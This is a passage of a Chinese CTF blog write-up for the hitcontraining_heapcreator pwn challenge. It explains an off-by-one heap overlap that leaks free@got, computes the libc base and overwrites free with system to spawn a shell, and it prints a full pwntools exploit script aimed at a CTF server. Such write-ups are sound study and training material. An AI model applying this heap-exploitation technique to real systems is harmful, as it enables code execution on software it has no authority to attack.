+<p>​	然后我们再申请<code>0x30</code>的_chunk_用来存储数据（还有<code>0x10</code>的空间存储_prve_size_和_size_），又因为_fastbins_中正好有<code>0x40</code>的_fastbins_chunk_，所以<code>0x12c2040</code>及下面<code>0x40</code>的内存空间就成了新_chunk_的内存_chunk_，<code>0x12c2060</code>及下面<code>0x20</code>的内存空间就成了新_chunk_的指针内存。</p>
+<p>​	然后我们把_free@got_写到内存_chunk_的<code>0x12c2078</code>地址里，这个地址存储着指针_chunk_里的指针，所以现在指针就是_free@got_，而_show_函数打印出来的数据是该指针指向的内容，也就是_free@got_指向的内容。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102155262.png" alt="image-20240710215550221"></p>
+<h4 id="覆盖-free-got-表"><a href="#覆盖-free-got-表" class="headerlink" title="覆盖_free@got_表"></a>覆盖_free@got_表</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​	同样，_edit_函数修改_chunk_内容，也是修改指针_chunk_的指针指向的区域。得到_system_的地址后，直接用_edit_函数修改_chunk1_的内容即可。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102208262.png" alt="image-20240710220849174"></p>
+<p>最后直接_free_掉_chunk0_，便能执行<code>system(&quot;/bin/sh&quot;)</code>，得到_shell_。</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28974</span>)</span><br><span class="line">debug(p,<span class="number">0x400DC4</span>,<span class="number">0x400DB8</span>,<span class="number">0x400DD0</span>,<span class="number">0x400DDC</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到_flag_</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102221509.png" alt="image-20240710222113464"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" rel="prev" title="SSTI漏洞基础知识学习">
+      <i class="fa fa-chevron-left"></i> SSTI漏洞基础知识学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/unlink%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="unlink学习笔记">
+      unlink学习笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#roarctf-2019-easy-pwn"><span class="nav-number">1.</span> <span class="nav-text">roarctf_2019_easy_pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.1.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%84%E6%BC%8F-libc"><span class="nav-number">1.2.1.</span> <span class="nav-text">泄漏_libc_</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-chunk1-size"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">修改_chunk1_size_</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%99%E5%85%A5-fake-chunk2-size"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">写入_fake_chunk2_size_</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-chunk1-hook-size"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">修改_chunk1_hook_size_</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#one-gadget-%E8%8E%B7%E5%8F%96-shell"><span class="nav-number">1.2.2.</span> <span class="nav-text">one_gadget_获取_shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B0%E8%AE%BE-real-chunk2-size"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">新设_real_chunk2_size_</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-fast-bin-%E4%B8%AD%E7%9A%84-fd-bk"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">修改_fast bin_中的_fd,bk_</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E4%B8%A4%E4%B8%AA-hook"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">劫持两个_hook_</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hitcontraining-heapcreator"><span class="nav-number">2.</span> <span class="nav-text">hitcontraining_heapcreator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#off-by-one-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">2.1.</span> <span class="nav-text">_off-by-one_利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1"><span class="nav-number">2.2.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.3.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%B9%E5%86%99-size"><span class="nav-number">2.3.1.</span> <span class="nav-text">改写_size_</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%84%E6%BC%8F-free-addr"><span class="nav-number">2.3.2.</span> <span class="nav-text">泄漏_free_addr_</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E7%9B%96-free-got-%E8%A1%A8"><span class="nav-number">2.3.3.</span> <span class="nav-text">覆盖_free@got_表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">2.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_2.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">280k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
